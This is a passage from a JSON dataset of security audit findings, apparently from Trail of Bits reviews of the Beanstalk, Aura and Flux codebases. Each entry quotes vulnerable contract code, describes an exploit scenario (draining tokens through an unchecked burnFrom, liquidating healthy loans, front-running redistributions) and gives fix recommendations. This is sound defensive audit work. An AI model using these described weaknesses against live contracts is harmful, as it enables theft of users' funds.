        "body": "Stalk is the governance token of the system, rewarded to users who deposit certain whitelisted assets into the silo, the systems asset storage. When demand for Bean increases, the protocol increases the Bean supply by minting new Bean tokens and allocating some of them to Stalk holders. Additionally, if the price of Bean remains above its peg for an extended period of time, then a season of plenty (SoP) occurs: Bean is minted and sold on the open market in exchange for exogenous assets such as ETH. These exogenous assets are allocated entirely to Stalk holders. When demand for Bean decreases, the protocol decreases the Bean supply by borrowing Bean tokens from Bean owners. If the demand for Bean is persistently low and some of these loans are never repaid, Stalk holders are not directly penalized by the protocol. However, if the only whitelisted assets are strongly correlated with the price of Bean (such as ETH:BEAN LP tokens), then the value of Stalk holders deposited collateral would decline, indirectly penalizing Stalk holders for an unhealthy system. If, however, exogenous assets without a strong correlation to Bean are whitelisted, then Stalk holders who have deposited such assets will be protected from nancial penalties if the price of Bean crashes. Exploit Scenario Stalk holders vote to whitelist ETH as a depositable asset. They proceed to deposit ETH and begin receiving shares of rewards, including 3CRV tokens acquired during SoPs. Governance is now incentivized to increase the supply of Bean as high as possible to obtain more 3CRV rewards, which eventually results in an overextension of the Bean supply and a subsequent price crash. After the Bean price crashes, Stalk holders withdraw their deposited ETH and 3CRV rewards. Because ETH is not strongly correlated with the price of Bean, they do not suer nancial loss as a result of the crash. Alternatively, because of the lack of on-chain enforcement of o-chain votes, the above scenario could occur if the community multisignature wallet whitelists ETH, even if no related vote occurred. Recommendations Do not allow any assets that are not strongly correlated with the price of Bean to be whitelisted. Additionally, implement monitoring systems that provide alerts every time a new asset is whitelisted.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "13. Unchecked burnFrom return value ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf",
        "body": "While recapitalizing the Beanstalk protocol, Bean and LP tokens that existed before the 2022 governance hack are represented as unripe tokens. Ripening is the process of burning unripe tokens in exchange for a pro rata share of the underlying assets generated during the Barn Raise. Holders of unripe tokens call the ripen function to receive their portion of the recovered underlying assets. This portion grows while the price of Bean is above its peg, incentivizing users to ripen their tokens later, when more of the loss has been recovered. The ripen code assumes that if users try to redeem more unripe tokens than they hold, burnFrom will revert. If burnFrom returns false instead of reverting, the failure of the balance check will go undetected, and the caller will be able to recover all of the underlying tokens held by the contract. While LibUnripe.decrementUnderlying will revert on calls to ripen more than the contracts balance, it does not check the users balance. The source code of the unripeToken contract was not provided for review during this audit, so we could not determine whether its burnFrom method is implemented safely. function ripen ( address unripeToken , uint256 amount , LibTransfer.To mode ) external payable nonReentrant returns ( uint256 underlyingAmount ) { underlyingAmount = getPenalizedUnderlying(unripeToken, amount); LibUnripe.decrementUnderlying(unripeToken, underlyingAmount); IBean(unripeToken).burnFrom( msg.sender , amount); address underlyingToken = s.u[unripeToken].underlyingToken; IERC20(underlyingToken).sendToken(underlyingAmount, msg.sender , mode); emit Ripen( msg.sender , unripeToken, amount, underlyingAmount); } Figure 13.1: The ripen() function in UnripeFacet.sol#L51- Exploit Scenario Alice notices that the burnFrom function is implemented incorrectly in the unripeToken contract. She calls ripen with an amount greater than her unripe token balance and is able to receive the contracts entire balance of underlying tokens. Recommendations Short term, add an assert statement to ensure that users who call ripen have sucient balance to burn the given amount of unripe tokens. Long term, implement all security-critical assertions on user-supplied input in the beginning of external functions. Do not rely on untrusted code to perform required safety checks or to behave as expected.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "1. Healthy loans can be liquidated ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-aura-securityreview.pdf",
        "body": "Due to missing validation that the loan's threshold is less than the LTV, an arbitrary loan can be liquidated if the threshold is between the MAX_PENALTY_LTV and MAX_THRESHOLD variables. When loans are insolvent, liquidations via the stability pool can occur by calling the absorb function, which will use funds from the stability pool to cover a borrower's debt. To verify that a loan is liquidatable, the loan's LTV is checked against the MAX_PENALTY_LTV variable, with the rationale that the loan's threshold must be less than the LTV. This would mean that the loan's LTV is larger than the threshold , marking it insolvent: // Performs stability pool liquidations to pay down a trove's debt in full and transfer the // freed collateral to the stability pool. If the stability pool does not have sufficient yin, // the trove's debt and collateral will be proportionally redistributed among all troves // containing the trove's collateral. // - Amount of debt distributed to each collateral = (value of collateral / trove value) * trove debt // Reverts if the trove's LTV is not above the maximum penalty LTV // - This also checks the trove is liquidatable because threshold must be lower than max penalty LTV. // Returns a tuple of an ordered array of yang addresses and an ordered array of asset amounts // in the decimals of each respective asset due to the caller as compensation. #[external] fn absorb (trove_id: u64 ) -> (Span<ContractAddress>, Span< u128 >) { let shrine: IShrineDispatcher = shrine::read(); let (trove_threshold, trove_ltv, trove_value, trove_debt) = shrine.get_trove_info(trove_id); assert(trove_ltv.val > MAX_PENALTY_LTV, 'PU: Not absorbable'); Figure 1.1: The absorb function ( Purger.cairo#L167-L181 ) However, the threshold may not be less than the MAX_PENALTY_LTV variable. The only bound it has is the MAX_THRESHOLD variable, which is larger than MAX_PENALTY_LTV : const MAX_THRESHOLD: u128 = 1000000000000000000000000000 ; // (ray): RAY_ONE Figure 1.2: The MAX_THRESHOLD constant ( Shrine.cairo #L31 ) #[external] fn set_threshold (yang: ContractAddress , new_threshold: Ray ) { AccessControl::assert_has_role(ShrineRoles::SET_THRESHOLD); assert(new_threshold.val <= MAX_THRESHOLD, 'SH: Threshold > max'); thresholds::write(get_valid_yang_id(yang), new_threshold); // Event emission ThresholdUpdated(yang, new_threshold); } Figure 1.3: The set_threshold function ( Shrine.cairo#L449-L458 ) As a result, if a loan has MAX_PENALTY_LTV < threshold < MAX_THRESHOLD and LTV < threshold , it will incorrectly be agged for liquidation. Exploit Scenario Alice, a borrower, has a position with an LTV of 90% and a threshold of 95%. Eve, a malicious user, calls absorb and incorrectly liquidates Alice's position. As a result, Alice loses her funds. Recommendations Short term, set the MAX_THRESHOLD value to be the same as the MAX_PENALTY_LTV value. Long term, improve unit tests to increase coverage and ensure intended behavior throughout the system.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "2. block.timestamp is entirely determined by the sequencer ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-aura-securityreview.pdf",
        "body": "The block.timestamp value is used throughout the codebase for validating critical operations that depend on the time. However, in Starknet, there are currently no restrictions on the return values of the get_block_timestamp() function. As a result, the sequencer can submit an arbitrary timestamp that may not be correct. Exploit Scenario The sequencer of Starknet returns an incorrect block.timestamp , which causes many important checks throughout the protocol to fail (e.g., oracle and interest rate updates). As a result, the Aura protocol is unusable. Recommendations Short term, keep parts of the codebase that depend on the timestamp to a minimum. Long term, stay up to date with the latest Starknet documentation.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Incorrect event emission in the Equalizer ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-aura-securityreview.pdf",
        "body": "When the equalize function is called in the Equalizer contract, the function iterates over the array of addresses to be allocated to. This is implemented by popping the rst element from the recipients and percentages arrays and looping until the array is empty. After all the allocations have been performed, the function emits an event that records the contents of the recipients array, the contents of the percentages array, and the total surplus that was minted. However, because the arrays are modied during execution, the values emitted in the event will be incorrect. loop { match recipients. pop_front() { Option :: Some (recipient) => { let amount: Wad = rmul_wr(surplus, *(percentages. pop_front() .unwrap())); shrine.inject(*recipient, amount); minted_surplus += amount; }, Option :: None (_) => { break ; } }; }; // Safety check to assert yin is less than or equal to total debt after minting surplus // It may not be equal due to rounding errors let updated_total_yin: Wad = shrine.get_total_yin(); assert(updated_total_yin <= total_debt, 'EQ: Yin exceeds debt'); Equalize( recipients, percentages, minted_surplus); Figure 3.1: A snippet of the equalize function ( equalizer.cairo#L100-L119 ) Exploit Scenario An issue in the Equalizer (either due to a bug or an error when setting the Allocator ) results in surplus being minted in the wrong proportions. This is discovered after several epochs, and the Aura team reviews event logs to trace the impact. The incorrect Equalize events make this eort more dicult. Recommendations Short term, update the equalize function so that it emits accurate information. This could include modifying the loop to use a counter, making a copy of the arrays before looping, or removing these arrays from the event emission. Long term, carefully consider how the ability to log state changes could be impacted when designing loops that will process data.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. Unchecked ERC-20 return values in the Absorber ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-aura-securityreview.pdf",
        "body": "The transfer_assets function in the Absorber contract serves as a helper function to transfer multiple assets to a target address in one function call. Per the ERC-20 standard, calls to the transfer function return a Boolean indicating whether the call was successful, and developers must not assume that false is never returned and that the token contract will revert instead. However, the return value of the call to transfer in transfer_assets is not checked. As the tokens being transferred by this function will be third-party contracts, and given the history of diering ERC-20 implementations in the Ethereum ecosystem, validating the outcome of these function calls is strongly recommended. Option :: Some (asset) => { let asset_amt: u128 = *asset_amts.pop_front().unwrap(); if asset_amt != 0 { let asset_amt: u256 = asset_amt.into(); IERC20Dispatcher { contract_address: *asset }.transfer(to, asset_amt); } }, Figure 4.1: A snippet from the transfer_assets function ( absorber.cairo#L893-L899 ) Exploit Scenario Alice is a provider in the Absorber . One of the collateral tokens is briey paused to perform an upgrade. While the token is paused, Alice attempts to claim her share of the absorbed collateral and rewards. The transfer of the paused token fails silently and Alice loses some of her share of the absorbed assets. Recommendations Short term, add a check to verify that the transfer call in transfer_assets was successful. Long term, always have the code validate return values whenever possible, especially when interacting with third-party contracts.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Incorrect loop starting index in propagate_reward_errors ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-aura-securityreview.pdf",
        "body": "In the Absorber contract, reward tokens are stored in a mapping based on their reward ID, starting at 1. Most instances where the set of reward tokens is iterated over properly start the loop at 1, but in the propagate_reward_errors function, the current_rewards_id counter is initialized to 0, contrary to the comment above the function. // total number of reward tokens, starting from 1 // a reward token cannot be removed once added. rewards_count: u8 , // mapping from a reward token address to its id for iteration reward_id: LegacyMap ::<ContractAddress, u8 >, // mapping from a reward token ID to its Reward struct: // 1. the ERC-20 token address // 2. the address of the vesting contract (blesser) implementing `IBlesser` for the ERC-20 token // 3. a boolean indicating if the blesser should be called rewards: LegacyMap ::< u8 , Reward>, Figure 5.1: The declaration of the rewards data structures ( absorber.cairo#L103-L112 ) // `current_rewards_id` should start at `1`. fn propagate_reward_errors (rewards_count: u8 , epoch: u32 ) { let mut current_rewards_id: u8 = 0 ; Figure 5.2: A snippet of the propagate_reward_errors function ( absorber.cairo#L1087-L1089 ) Recommendations Short term, update the index to start at 1. Long term, carefully review the upper and lower bounds of loops, especially when the codebase uses both 0-indexed and 1-indexed loops.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Redistributions may not account for accrued interest on debt ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-aura-securityreview.pdf",
        "body": "During a stability pool liquidation, yin taken from the Absorber contract is used to repay a troves debt and restore solvency. The troves collateral is then sent back to the Absorber as a reward. If the Absorber does not have enough yin to cover all of a troves bad debt, a redistribution occurs. During a redistribution, the debt and collateral from an insolvent trove are allocated to all the remaining troves in the system. // If absorber does not have sufficient yin balance to pay down the trove's debt in full, // cap the amount to pay down to the absorber's balance (including if it is zero). let purge_amt = min(max_purge_amt, absorber_yin_bal); // Transfer a percentage of the penalty to the caller as compensation let (yangs, compensations) = free(shrine, trove_id, compensation_pct, caller); let can_absorb_any: bool = purge_amt.is_non_zero(); let is_fully_absorbed: bool = purge_amt == max_purge_amt; // Only update the absorber and emit the `Purged` event if Absorber has some yin // to melt the trove's debt and receive freed trove assets in return if can_absorb_any { let percentage_freed: Ray = get_percentage_freed( ltv_after_compensation, value_after_compensation, trove_debt, trove_penalty, purge_amt ); // Melt the trove's debt using the absorber's yin directly shrine.melt(absorber.contract_address, trove_id, purge_amt); // Free collateral corresponding to the purged amount let (yangs, absorbed_assets_amts) = free( shrine, trove_id, percentage_freed, absorber.contract_address ); absorber.update(yangs, absorbed_assets_amts); Purged( trove_id, purge_amt, percentage_freed, absorber.contract_address, absorber.contract_address, yangs, absorbed_assets_amts ); } // If it is not a full absorption, perform redistribution. if !is_fully_absorbed { shrine.redistribute(trove_id); // Update yang prices due to an appreciation in ratio of asset to yang from // redistribution oracle::read().update_prices(); } Compensate(caller, yangs, compensations); (yangs, compensations) } Figure 6.1: A snippet of the absorb function ( purger.cairo#L299-L352 ) However, the redistributed debt may not correctly accrue interest. The redistribute function assumes that shrine.melt , which uses the charge function to accrue interest, was called. However, if the can_absorb_any variable is false , then shrine.melt will never be called and the interest on the troves debt will never be correctly accrued. // Trove's debt should have been updated to the current interval via `melt` in `Purger.purge`. // The trove's debt is used instead of estimated debt from `get_trove_info` to ensure that // system has accounted for the accrued interest. Figure 6.2: The comment in the redistribute function ( shrine.cairo#L732-L734 ) Exploit Scenario Due to a series of liquidations, the Absorber has a remaining yin balance of 0 . Eve has a position that is eligible for liquidation due to a large amount of interest accrued on her debt. Eve calls the absorb function, and because there is no yin in the Absorber , the interest is never accrued. As a result, the system incorrectly has more bad debt than was redistributed. Recommendations Short term, modify the code to make a call to the charge function in the redistribute function. Long term, keep track of the necessary state changes needed before and after an operation, and make sure to have the code handle edge cases where these state changes may not occur.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Marginal penalty may be scaled even if the threshold is equal to the absorption threshold ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-aura-securityreview.pdf",
        "body": "If a trove becomes eligible for liquidation, a penalty is applied to punish users who have insolvent positions. When computing the absorption penalty, the get_absorption_penalty function is used. As the comment above the function says, if the LTV exceeds the absorption threshold, the marginal penalty is scaled by the penalty scalar. However, the function will also scale the penalty if the troves threshold is equal to the absorption threshold. This could cause a user to have to pay a higher penalty than originally intended. // If LTV exceeds ABSORPTION_THRESHOLD, the marginal penalty is scaled by `penalty_scalar`. fn get_absorption_penalty_internal ( threshold: Ray , ltv: Ray , ltv_after_compensation: Ray ) -> Option <Ray> { if ltv <= threshold { return Option :: None (()); } // It's possible for `ltv_after_compensation` to be greater than one, so we handle this case // to avoid underflow. Note that this also guarantees `ltv` is lesser than one. if ltv_after_compensation > RAY_ONE.into() { return Option :: Some (RayZeroable::zero()); } // The `ltv_after_compensation` is used to calculate the maximum penalty that can be charged // at the trove's current LTV after deducting compensation, while ensuring the LTV is not worse off // after absorption. let max_possible_penalty = min( (RAY_ONE.into() - ltv_after_compensation) / ltv_after_compensation, MAX_PENALTY.into() ); if threshold >= ABSORPTION_THRESHOLD.into() { let s = penalty_scalar::read(); let penalty = min( MIN_PENALTY.into() + s * ltv / threshold - RAY_ONE.into(), max_possible_penalty ); return Option :: Some (penalty); } Figure 7.1: The penalty calculation ( purger.cairo#L450-L478 ) Exploit Scenario Alice, a user of the Aura protocol, opens a trove. After market conditions change, her trove becomes eligible for liquidation. However, because her troves threshold is equal to the absorption threshold, she must pay an extra penalty beyond that intended. Recommendations Short term, update the conditional to the following: if threshold > ABSORPTION_THRESHOLD.into() Long term, improve unit test coverage to uncover edge cases and ensure intended behavior throughout the protocol.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. The share conversion rate may be zero even if the Absorber is not empty ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-aura-securityreview.pdf",
        "body": "After a stability pool liquidation by the Absorber contract, the update function is used to update the shares of seized collateral that stakers are entitled to. In addition, if the amount of yin in the stability pool becomes empty or goes below the YIN_SHARE_PER_THRESHOLD constant value, a new epoch is started. When a new epoch is started, the epoch_share_conversion_rate variable must be set appropriately. This variable determines the rate at which vault shares can be exchanged for underlying yin and rewards. If there is no yin in the Absorber , the conversion rate is 0; otherwise, the conversion rate must be 1:1. if YIN_PER_SHARE_THRESHOLD > yin_per_share.val { let new_epoch: u32 = current_epoch + 1 ; current_epoch::write(new_epoch); // If new epoch's yin balance exceeds the initial minimum shares, deduct the initial // minimum shares worth of yin from the yin balance so that there is at least such amount // of yin that cannot be removed in the next epoch. if INITIAL_SHARES <= yin_balance.val { let epoch_share_conversion_rate: Ray = wadray::rdiv_ww( yin_balance - INITIAL_SHARES.into(), total_shares ); epoch_share_conversion_rate::write(current_epoch, epoch_share_conversion_rate); total_shares::write(yin_balance); } else { // Otherwise, set the epoch share conversion rate to 0 and total shares to 0. // This is to prevent an attacker from becoming a majority shareholder // in a new epoch when the number of shares is very small, which would // allow them to execute an attack similar to a first-deposit front-running attack. // This would cause a negligible loss to the previous epoch's providers, but // partially compensates the first provider in the new epoch for the deducted // minimum initial amount. epoch_share_conversion_rate::write(current_epoch, 0_ u128 .into()); total_shares::write( 0_ u128 .into()); } Figure 8.1: Part of the update function ( absorber.cairo#L596-L609 ) However, due to the incorrect conditional check, it may be possible for the epoch conversion rate to be 0, even if there is yin remaining in the Absorber . If the balance of yin after a stability pool liquidation is equal to the INITIAL_SHARES constant value, then the epoch_share_conversion_rate will be set to 0 while the total_shares variable will be set to 1,000 (the value of INITIAL_SHARES ). This could lead to unexpected behavior and incorrect protocol accounting downstream. Exploit Scenario After a stability pool liquidation, the Absorber is left with 1,000 yin. The update function incorrectly sets the epoch_share_conversion rate to 0 after the liquidation. When Alice, a staker in the Absorber , tries to withdraw some of her rewards for the epoch, the protocol incorrectly calculates her reward balance as 0. As a result, Alice loses some of her rewards. Recommendations Short term, update the conditional to the following: if INITIAL_SHARES < yin_balance.val Long term, improve unit test coverage to uncover edge cases and ensure intended behavior throughout the protocol.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. Missing safety check in the Purgers absorb function ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-aura-securityreview.pdf",
        "body": "The Purger has separate entry point functions for performing searcher liquidations ( liquidate ) and for triggering absorptions and redistributions ( absorb ). For the most part, both functions follow a comparable sequence of steps with one exception: after updating the troves debt and seizing the collateral, liquidate includes an extra safety check that will revert if the troves LTV somehow increased as a result of the liquidation, while absorb omits any such check. This should not be possible in normal operations, but consistent application of this check could block a future bug or edge case in liquidation logic from being exploitable. shrine.melt(funder, trove_id, purge_amt); // Free collateral corresponding to the purged amount let (yangs, freed_assets_amts) = free(shrine, trove_id, percentage_freed, recipient); // Safety check to ensure the new LTV is lower than old LTV let (_, updated_trove_ltv, _, _) = shrine.get_trove_info(trove_id); assert(updated_trove_ltv <= trove_ltv, 'PU: LTV increased'); Figure 9.1: The extra safety check ( purger.cairo#L245-L252 ) Recommendations Short term, add the missing check to the absorb function to ensure its LTV never increases. Long term, review functionalities that perform similar operations and ensure they follow comparable steps.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. Pair IDs are not validated to be unique ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-aura-securityreview.pdf",
        "body": "When adding a yang to the Pragma contract, a pair_id is specied. This pair_id acts as a unique identier that determines the price feed used by Pragma. For example, the pair_id for the ETH/USD price feed would be the felt252 representation of the string ETH/USD . However, there is no check that the pair_id is unique when adding a yang. This could lead to a dierent yang using an incorrect price feed instead of the intended one. #[external] fn add_yang (pair_id: u256 , yang: ContractAddress ) { AccessControl::assert_has_role(PragmaRoles::ADD_YANG); assert(pair_id != 0 , 'PGM: Invalid pair ID'); assert(yang.is_non_zero(), 'PGM: Invalid yang address'); assert_new_yang(yang); // doing a sanity check if Pragma actually offers a price feed // of the requested asset and if it's suitable for our needs let response: PricesResponse = oracle::read().get_data_median(DataType::Spot(pair_id)); // Pragma returns 0 decimals for an unknown pair ID assert(response.decimals != 0 , 'PGM: Unknown pair ID'); assert(response.decimals <= 18_ u256, 'PGM: Too many decimals'); let index: u32 = yangs_count::read(); let settings = YangSettings { pair_id, yang }; Figure 10.1: The add_yang function ( pragma.cairo#L178-L193 ) Exploit Scenario Alice, the admin of the contracts, accidentally uses the ETH/USD pair_id when adding wBTC as a yang in the Pragma contract. Despite ETH being already added, the price feed for wBTC will incorrectly use the ETH/USD feed, resulting in a completely incorrect price. Recommendations Short term, have the code store the used pair_id s in a mapping and validate that a pair_id has not been used when adding a new yang. Long term, review functionalities that perform similar operations and ensure they follow comparable steps.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. Invalid price updates still update last_price_update_timestamp ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-aura-securityreview.pdf",
        "body": "The Aura contracts rely on price updates from the Pragma oracle to provide necessary price data to the system. Price updates take place periodically based on the update_frequency state variable. In addition, invalid price updates (i.e., price updates that do not meet the minimum requirements for the number of sources aggregated or that are too old) are rejected by the contract. If there is an invalid price update, no state variables are updated and an InvalidPriceUpdate event is emitted instead. However, even if every price update is invalid, the last_price_update_timestamp variable is updated. This could potentially cause delays when computing price updates. // if we receive what we consider a valid price from the oracle, record it in the Shrine, // otherwise emit an event about the update being invalid if is_valid_price_update(response, asset_amt_per_yang) { shrine::read().advance(settings.yang, price * asset_amt_per_yang); } else { InvalidPriceUpdate( settings.yang, price, response.last_updated_timestamp, response.num_sources_aggregated, asset_amt_per_yang ); } idx += 1 ; }; // record and emit the latest prices update timestamp last_price_update_timestamp::write(block_timestamp); PricesUpdated(block_timestamp, get_caller_address()); } Figure 11.1: Part of the update_prices function ( pragma.cairo#L232-L252 ) Exploit Scenario Due to an issue with an o-chain data provider, the Pragma oracle uses a lower number of aggregated sources than the threshold dened by the contract. As a result, every price update is considered invalid, but the last_price_update_timestamp variable is updated regardless. When the o-chain data provider resumes working, update_prices cannot be called for a larger delay than intended, leading to stale prices in the system. Recommendations Short term, modify the code to track the number of invalid price updates that occur when update_prices is called. If this number is equal to the yang count (i.e., no price update was performed), then last_price_update_timestamp should not be updated. Long term, keep track of the necessary preconditions needed for state updates. Have the code validate that state updates take place only if these preconditions are met.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "12. Redistributions can occur even if the Shrine is killed ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-aura-securityreview.pdf",
        "body": "The Aura protocol has steps to shut down gracefully. First, the Caretaker::shut function is invoked, which kills the Shrine and withdraws collateral from the Gate contract to the Caretaker contract. The amount of collateral withdrawn is enough to back the total system yin at a 1:1 ratio. During a shutdown, the Caretaker contract will allow trove owners to burn their yin to claim back their collateral. Notably, when the Shrine is killed, its forge and melt functions revert. However, there is nothing stopping a redistribution from occurring when the Shrine is killed as long as the Absorber s yin balance is emptied. Similar to nding 6, if the can_absorb_any variable is false , then shrine.melt will never be called and the call to the absorb function will not revert. If a trove is eligible for absorption, then before the trove owner can call the release function to withdraw their excess collateral, an attacker can front-run them and call absorb , triggering a redistribution. // Only update the absorber and emit the `Purged` event if Absorber has some yin // to melt the trove's debt and receive freed trove assets in return if can_absorb_any { let percentage_freed: Ray = get_percentage_freed( ltv_after_compensation, value_after_compensation, trove_debt, trove_penalty, purge_amt ); // Melt the trove's debt using the absorber's yin directly shrine.melt(absorber.contract_address, trove_id, purge_amt); // Free collateral corresponding to the purged amount let (yangs, absorbed_assets_amts) = free( shrine, trove_id, percentage_freed, absorber.contract_address ); absorber.update(yangs, absorbed_assets_amts); Purged( trove_id, purge_amt, percentage_freed, absorber.contract_address, absorber.contract_address, yangs, absorbed_assets_amts ); } // If it is not a full absorption, perform redistribution. if !is_fully_absorbed { shrine.redistribute(trove_id); // Update yang prices due to an appreciation in ratio of asset to yang from // redistribution oracle::read().update_prices(); } Compensate(caller, yangs, compensations); (yangs, compensations) } Figure 12.1: Part of the absorb function ( purger.cairo#L309-L352 ) Exploit Scenario The Shrine is killed and trove owners pull their yin out of the Absorber contract to reclaim their collateral from the Caretaker . Collateral prices fall and Bobs trove is eligible for absorption. Before Bob can call release to withdraw the excess collateral from a trove, Eve, a malicious user, front-runs him and calls absorb . This forces a redistribution, and as a result, Bob loses his excess collateral permanently. Recommendations Short term, make sure redistributions revert if the Shrine is killed. Long term, improve unit test coverage to uncover edge cases and ensure intended behavior throughout the protocol.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "13. Flash fee is not taken from receiver ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-aura-securityreview.pdf",
        "body": "The Flashmint module allows users to mint a percentage of the total yin supply at once as long as they repay the yin at the end of the transaction. In addition, a user must also pay a fee for this ashmint, given by the FLASH_FEE constant. The Flashmint module is intended to be EIP-3156compliant, and as such, it implements the appropriate functions and callbacks. Per EIP-3156, the flash_loan function must receive the ashloaned amount plus the ash fee from the callback; however, shrine.eject is called with only amount as a parameter. Currently, the ash fee is set to 0 so no funds will be lost, but this does break EIP-3156 compliance. shrine.inject(receiver, amount_wad); let initiator: ContractAddress = starknet::get_caller_address(); let borrower_resp: u256 = IFlashBorrowerDispatcher { contract_address: receiver }.on_flash_loan(initiator, token, amount, FLASH_FEE, call_data); assert(borrower_resp == ON_FLASH_MINT_SUCCESS, 'FM: on_flash_loan failed'); // This function in Shrine takes care of balance validation shrine.eject(receiver, amount_wad); Figure 13.1: Part of the flash_mint function ( flashmint.cairo#L98-L109 ) Recommendations Short term, make sure the code includes the FLASH_FEE when calling shrine.eject . Long term, carefully monitor EIPS and ensure that the protocol meets every requirement from the specication. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. SetExpiration does not set the expiration for the given key ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-flux-securityreview.pdf",
        "body": "The SetExpiration function does not change the expiration for the given key because it does not store the updated item back in the specic cache item (gure 1.1). The SetExpiration function retrieves the corresponding item from the cache and assigns it to the item variable (gure 1.1, line 165). Then it updates the items expiration time by setting its Expiration eld to the current time plus the provided expiration duration (gure 1.1, line 170). Finally, the lock on the cache is released without the prior cache update (gure 1.1, line 171), so any subsequent access to the cache item with the given key will not see the updated expiration set by SetExpiration . 163 164 165 166 167 168 169 170 171 172 } func ( c *cache ) SetExpiration(key string , expiration time.Duration) { c.mu.Lock() item, ok := c.Items[key] if !ok { c.mu.Unlock() return } item.Expiration = time.Now().Add(expiration).UnixNano() c.mu.Unlock() Figure 1.1: The SetExpiration function responsible for setting the expiration for the given key ( source-controller/internal/cache/cache.go#163172 ) Exploit Scenario A developer intentionally places sensitive data with a specic expiration date in the cache. An attacker gains access to condential information because the sensitive data has not expired. This allows the attacker to further compromise the system. Recommendations Short term, explicitly assign the updated item variable back to the c.Items map before releasing the lock (gure 1.2). func (c *cache) SetExpiration(key string , expiration time.Duration) { c.mu.Lock() if item, ok := c.Items[key]; ok { item.Expiration = time.Now().Add(expiration).UnixNano() c.Items[key] = item } c.mu.Unlock() } Figure 1.2: The proposed x that updates the expiration time correctly Long term, extend unit tests in the cache_test.go le to cover the SetExpiration function.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Inappropriate string trimming function ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-flux-securityreview.pdf",
        "body": "The handlePayload function fails to remove a specic substring as intended because its implementation uses the strings.TrimLeft function (gure 2.1). The incoming HTTP request URL ( r.RequestURI ) is passed to the strings.TrimLeft function with the apiv1.ReceiverWebhookPath parameter, which is set to /hook (gure 2.1, line 74). The goal is to remove this specic substring from r.RequestURI . However, due to the use of strings.TrimLeft , all occurrences of the specied characters, instead of just the exact substring, are removed from the left side of the string. Consequently, the handling request path is incorrectly logged (gure 2.1, line 76). 71 func (s *ReceiverServer) handlePayload() func (w http.ResponseWriter, r *http.Request) { 72 73 74 return func (w http.ResponseWriter, r *http.Request) { ctx := context.Background() digest := url.PathEscape( strings.TrimLeft (r.RequestURI, apiv1.ReceiverWebhookPath)) // apiv1.ReceiverWebhookPath = /hook 75 76 s.logger.Info(fmt.Sprintf( \"handling request: %s\" , digest)) Figure 2.1: The use of strings.TrimLeft in the handlePayload function ( notification-controller/internal/server/receiver_handlers.go#7177 ) Recommendations Short term, x the handlePayload function to properly remove substrings from the remote URL using strings.TrimPrefix function. Long term, implement unit tests for all string-parsing functions. In the CI/CD pipeline, introduce the golangci-lint tool that uses the Staticcheck tool with the SA1024 check.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Gos default HTTP client uses a shared value that can be modied by other components ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-flux-securityreview.pdf",
